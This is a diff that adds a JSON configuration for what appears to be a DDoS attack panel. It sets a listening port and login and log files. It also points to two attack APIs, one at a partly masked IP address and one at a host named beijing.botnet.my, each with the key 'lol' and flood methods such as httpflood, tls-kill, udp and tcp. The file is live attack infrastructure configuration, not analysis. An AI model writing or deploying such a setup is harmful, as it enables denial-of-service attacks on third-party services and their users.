@@ -1,0 +1,36 @@
+{
+  "banner_file": "banner.txt",
+  "welcome_tfx": "welcome.tfx",
+  "attack_tfx": "attack.tfx",
+  "login_file": "login.txt",
+  "log_file": "logs.txt",
+  "port": 1111,
+  "apis": [
+    {
+      "name": "old_api",
+      "url": "http://143.20.1xx.96:9998/api/attack",
+      "key": "lol",
+      "methods": [
+        "httpflood",
+        "httpbypass",
+        "browser"
+      ],
+      "method_param": "method"
+    },
+    {
+      "name": "new_api",
+      "url": "http://beijing.botnet.my:8080/api/attack",
+      "key": "lol",
+      "methods": [
+        "overload",
+        "overloadv2",
+        "priv-flood",
+        "tls-kill",
+        "tls-lucifer",
+        "udp",
+        "tcp"
+      ],
+      "method_param": "method"
+    }
+  ]
+}
